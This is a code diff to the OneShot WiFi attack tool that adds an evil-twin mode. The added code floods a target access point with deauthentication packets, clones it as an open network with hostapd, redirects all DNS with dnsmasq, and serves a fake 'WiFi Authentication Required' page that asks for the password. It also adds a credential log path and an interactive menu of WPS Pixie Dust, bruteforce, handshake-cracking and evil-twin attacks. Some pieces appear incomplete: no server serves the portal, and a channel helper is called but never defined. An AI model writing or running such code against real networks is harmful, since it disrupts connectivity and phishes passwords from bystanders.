@@ -403,14 +403,20 @@ class BruteforceStatus:
 
 class Companion:
     """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False, max_deauth_retries=3, delay=None):
+    def __init__(self, interface, save_result=False, print_debug=False, max_deauth_retries=3, delay=None, auto_handshake=False, wordlist=None, evil_twin=False, deauth_spam=False,  portal_template=None, log_credentials=None):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
         self.max_deauth_retries = max_deauth_retries
         self.deauth_retries = 0
-        self.delay = delay   # simpan delay untuk digunakan nanti
-        # sisanya tetap sama
+        self.delay = delay
+        self.auto_handshake = auto_handshake
+        self.wordlist = wordlist
+        self.evil_twin = evil_twin
+        self.deauth_spam = deauth_spam
+        self.portal_template = portal_template
+        self.log_credentials = log_credentials or os.path.expanduser('~/.OneShot/credentials.log')
+
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -450,6 +456,114 @@ class Companion:
             if os.path.exists(self.wpas_ctrl_path):
                 break
             time.sleep(.1)
+    def _deauth_spam(self, bssid, interface, duration=60):
+        if not shutil.which('aireplay-ng'):
+            print("[!] aireplay-ng not found. Install aircrack-ng.")
+            return False
+        print(f"[*] Starting deauth spam on {bssid} for {duration} seconds...")
+        cmd = f"timeout {duration} aireplay-ng -0 0 -a {bssid} {interface}"
+        try:
+            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        except Exception as e:
+            print(f"[!] Deauth spam failed: {e}")
+            return False
+
+    def _create_evil_twin(self, bssid, essid, channel, interface):
+        if not shutil.which('hostapd'):
+            print("[!] hostapd not found. Install hostapd.")
+            return None, None
+        conf_content = f"""
+interface={interface}
+driver=nl80211
+ssid={essid}
+channel={channel}
+hw_mode=g
+auth_algs=1
+wpa=0
+wpa_key_mgmt=NONE
+"""
+        conf_file = f"/tmp/evil_twin_{int(time.time())}.conf"
+        with open(conf_file, 'w') as f:
+            f.write(conf_content)
+        cmd = f"hostapd {conf_file}"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"[*] Evil Twin AP running: {essid} (channel {channel})")
+        return proc, conf_file
+
+    def _run_dhcp_server(self, interface):
+        if not shutil.which('dnsmasq'):
+            print("[!] dnsmasq not found. Install dnsmasq.")
+            return None, None
+        conf_content = f"""
+interface={interface}
+dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+address=/#/192.168.1.1
+"""
+        conf_file = f"/tmp/dnsmasq_{int(time.time())}.conf"
+        with open(conf_file, 'w') as f:
+            f.write(conf_content)
+        subprocess.run(f"ip addr add 192.168.1.1/24 dev {interface}", shell=True, stderr=subprocess.DEVNULL)
+        subprocess.run(f"ip link set {interface} up", shell=True)
+        cmd = f"dnsmasq -C {conf_file} --pid-file=/tmp/dnsmasq.pid"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[*] DHCP server running")
+        return proc, conf_file
+
+    def _start_captive_portal(self, template_path=None):
+        html_content = """<!DOCTYPE html>
+<html>
+<head><title>WiFi Login</title></head>
+<body>
+    <h2>WiFi Authentication Required</h2>
+    <p>Enter your WiFi password to continue</p>
+    <form method="POST" action="/login">
+        <input type="password" name="password" placeholder="Enter password" required>
+        <button type="submit">Connect</button>
+    </form>
+</body>
+</html>"""
+        if template_path and os.path.exists(template_path):
+            with open(template_path, 'r') as f:
+                html_content = f.read()
+        html_file = f"/tmp/portal_{int(time.time())}.html"
+        with open(html_file, 'w') as f:
+            f.write(html_content)
+        print("[*] Captive portal running on http://192.168.1.1")
+        return html_file
+
+    def _run_evil_twin(self, bssid, essid, channel, interface):
+        print(f"[*] Launching Evil Twin attack on {essid} ({bssid})")
+        if self.deauth_spam:
+            self._deauth_spam(bssid, interface, duration=60)
+        hostapd_proc, conf_file = self._create_evil_twin(bssid, essid, channel, interface)
+        if not hostapd_proc:
+            return False
+        time.sleep(2)
+        dnsmasq_proc, dns_conf = self._run_dhcp_server(interface)
+        if not dnsmasq_proc:
+            hostapd_proc.terminate()
+            return False
+        self._start_captive_portal(self.portal_template)
+        print("[*] Evil Twin is running. Waiting for credentials...")
+        try:
+            while True:
+                time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n[*] Stopping Evil Twin...")
+        finally:
+            hostapd_proc.terminate()
+            if dnsmasq_proc:
+                dnsmasq_proc.terminate()
+            subprocess.run(f"ip addr del 192.168.1.1/24 dev {interface}", shell=True, stderr=subprocess.DEVNULL)
+            if os.path.exists(conf_file):
+                os.remove(conf_file)
+            if os.path.exists(dns_conf):
+                os.remove(dns_conf)
+        return True
 
     def sendOnly(self, command):
         """Sends command to wpa_supplicant"""
@@ -782,6 +896,13 @@ class Companion:
                 # Kegagalan lain (misal WPS_FAIL tanpa lock)
                 if store_pin_on_fail:
                     self.__savePin(bssid, pin)
+                # Jika evil-twin diaktifkan, coba serangan Evil Twin
+                if self.evil_twin and bssid:
+                    print("[*] WPS and handshake failed. Launching Evil Twin attack...")
+                    channel = self._get_channel(bssid)
+                    essid = self.connection_status.essid or bssid
+                    if self._run_evil_twin(bssid, essid, channel, self.interface):
+                        return True
                 return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
@@ -1141,6 +1262,126 @@ Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
 """
 
+def interactive_menu(interface):
+    """Menu interaktif untuk memilih mode serangan"""
+    print("\n=== OneShot Interactive Menu ===")
+    print(f"Interface: {interface}")
+    
+    while True:
+        print("\nChoose an attack mode:")
+        print("1. WPS Pixie Dust Attack (-K)")
+        print("2. WPS Bruteforce Attack (-B)")
+        print("3. Auto-Handshake Capture & Crack (--auto-handshake)")
+        print("4. Evil Twin Attack (--evil-twin)")
+        print("5. Evil Twin with Deauth Spam (--evil-twin --deauth-spam)")
+        print("6. Scan Networks Only")
+        print("7. Exit")
+        
+        choice = input("Enter choice (1-7): ").strip()
+        
+        if choice == '7':
+            print("Exiting...")
+            break
+        
+        # Untuk pilihan 1-6, kita butuh BSSID
+        bssid = None
+        if choice in ('1','2','3','4','5','6'):
+            scan = input("Scan for networks? (y/n): ").lower()
+            if scan == 'y':
+                scanner = WiFiScanner(interface)
+                bssid = scanner.prompt_network()
+                if not bssid:
+                    print("No target selected.")
+                    continue
+            else:
+                bssid = input("Enter BSSID (or press Enter to scan): ").strip()
+                if not bssid:
+                    scanner = WiFiScanner(interface)
+                    bssid = scanner.prompt_network()
+                    if not bssid:
+                        continue
+        
+        # Buat objek args simulasi
+        import argparse
+        args = argparse.Namespace()
+        args.interface = interface
+        args.bssid = bssid
+        args.pin = None
+        args.pixie_dust = False
+        args.bruteforce = False
+        args.auto_handshake = False
+        args.evil_twin = False
+        args.deauth_spam = False
+        args.write = False
+        args.verbose = False
+        args.delay = None
+        args.show_pixie_cmd = False
+        args.pixie_force = False
+        args.wordlist = None
+        args.portal_template = None
+        args.log_credentials = None
+        
+        # Set flag berdasarkan pilihan
+        if choice == '1':
+            args.pixie_dust = True
+        elif choice == '2':
+            args.bruteforce = True
+            delay = input("Delay between attempts (seconds, default 0): ")
+            if delay.strip():
+                args.delay = float(delay)
+        elif choice == '3':
+            args.auto_handshake = True
+            wordlist = input("Path to wordlist (or press Enter for default): ")
+            if wordlist.strip():
+                args.wordlist = wordlist
+        elif choice == '4':
+            args.evil_twin = True
+        elif choice == '5':
+            args.evil_twin = True
+            args.deauth_spam = True
+        elif choice == '6':
+            scanner = WiFiScanner(interface)
+            scanner.iw_scanner()
+            continue
+        
+        # Tanya apakah mau simpan hasil
+        save = input("Save results to file? (y/n): ").lower()
+        if save == 'y':
+            args.write = True
+        
+        # Tanya verbose
+        verb = input("Verbose output? (y/n): ").lower()
+        if verb == 'y':
+            args.verbose = True
+        
+        # Jalankan serangan
+        companion = Companion(
+            args.interface, args.write, print_debug=args.verbose,
+            max_deauth_retries=3, delay=args.delay,
+            auto_handshake=args.auto_handshake, wordlist=args.wordlist,
+            evil_twin=args.evil_twin, deauth_spam=args.deauth_spam,
+            portal_template=args.portal_template, log_credentials=args.log_credentials
+        )
+        
+        try:
+            if args.pixie_dust:
+                companion.single_connection(
+                    args.bssid, pin=None, pixiemode=True,
+                    showpixiecmd=args.show_pixie_cmd,
+                    pixieforce=args.pixie_force, delay=args.delay
+                )
+            elif args.bruteforce:
+                companion.smart_bruteforce(args.bssid, start_pin=args.pin, delay=args.delay)
+            elif args.auto_handshake or args.evil_twin:
+                companion.single_connection(
+                    args.bssid, pin=args.pin, pixiemode=False,
+                    showpixiecmd=args.show_pixie_cmd,
+                    pixieforce=args.pixie_force, delay=args.delay
+                )
+            else:
+                print("Invalid choice.")
+        except KeyboardInterrupt:
+            print("\nAttack interrupted.")
 
 if __name__ == '__main__':
     import argparse
@@ -1242,11 +1483,37 @@ if __name__ == '__main__':
     
     )
     parser.add_argument(
+        '--evil-twin',
+        action='store_true',
+        help='Launch Evil Twin attack (clone AP + captive portal)'
+    )
+    parser.add_argument(
+        '--deauth-spam',
+        action='store_true',
+        help='Send continuous deauth to target AP'
+    )
+    parser.add_argument(
+        '--portal-template',
+        type=str,
+        default=None,
+        help='Path to custom HTML template for captive portal'
+    )
+    parser.add_argument(
+        '--log-credentials',
+        type=str,
+        default='~/.OneShot/credentials.log',
+        help='File to save captured credentials'
+    )
+    parser.add_argument(
+            '--menu',
+            action='store_true',
+            help='Run interactive menu mode'
+    )
+    parser.add_argument(
         '-v', '--verbose',
         action='store_true',
         help='Verbose output'
         )
-
     args = parser.parse_args()
 
     if sys.hexversion < 0x03060F0:
@@ -1264,11 +1531,18 @@ if __name__ == '__main__':
 
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
+    if args.evil_twin:
+            for tool in ['hostapd', 'dnsmasq']:
+                if not shutil.which(tool):
+                    print(f"[!] {tool} not found. Install it with 'pkg install {tool}'")
+                    sys.exit(1)
+    if args.menu or (len(sys.argv) == 1 and args.interface):
+        interactive_menu(args.interface)
+        sys.exit(0)
 
     while True:
         try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose,
-                                  max_deauth_retries=args.deauth_attempts, delay=args.delay)
+            companion = Companion(args.interface, args.write, print_debug=args.verbose, max_deauth_retries=args.deauth_attempts, delay=args.delay, auto_handshake=args.auto_handshake, wordlist=args.wordlist, evil_twin=args.evil_twin, deauth_spam=args.deauth_spam, portal_template=args.portal_template, log_credentials=args.log_credentials)
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
